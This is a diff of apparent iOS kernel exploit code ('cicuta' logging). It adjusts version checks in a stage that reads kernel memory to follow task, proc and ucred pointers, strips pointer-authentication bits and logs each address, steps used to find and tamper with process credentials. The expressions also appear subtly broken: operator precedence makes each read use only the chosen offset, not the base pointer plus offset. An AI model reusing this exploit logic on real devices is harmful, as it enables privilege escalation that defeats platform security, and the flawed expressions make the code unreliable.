@@ -380,14 +380,14 @@ stage1:
     uint64_t task = task_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", task_pac, task);
 #if defined(__arm64e__)
-    uint64_t proc_pac = read_64(task + kCFCoreFoundationVersionNumber <= kCFCoreFoundationVersionNumber_iOS_14_0 ? 0x388 : 0x3a0);
+    uint64_t proc_pac = read_64(task + kCFCoreFoundationVersionNumber < kCFCoreFoundationVersionNumber_iOS_14_0 ? 0x388 : 0x3a0);
 #else
-    uint64_t proc_pac = read_64(task + kCFCoreFoundationVersionNumber <= kCFCoreFoundationVersionNumber_iOS_14_0 ? 0x380 : 0x390);
+    uint64_t proc_pac = read_64(task + kCFCoreFoundationVersionNumber < kCFCoreFoundationVersionNumber_iOS_14_0 ? 0x380 : 0x390);
 #endif
     cicuta_log("proc PAC: 0x%llx", proc_pac);
     uint64_t proc = proc_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", proc_pac, proc);
-    uint64_t ucred_pac = read_64(proc + kCFCoreFoundationVersionNumber <= kCFCoreFoundationVersionNumber_iOS_14_0 ? 0x100 : 0xf0);
+    uint64_t ucred_pac = read_64(proc + kCFCoreFoundationVersionNumber < kCFCoreFoundationVersionNumber_iOS_14_0 ? 0x100 : 0xf0);
     cicuta_log("ucred PAC: 0x%llx", ucred_pac);
     uint64_t ucred = ucred_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", ucred_pac, ucred);
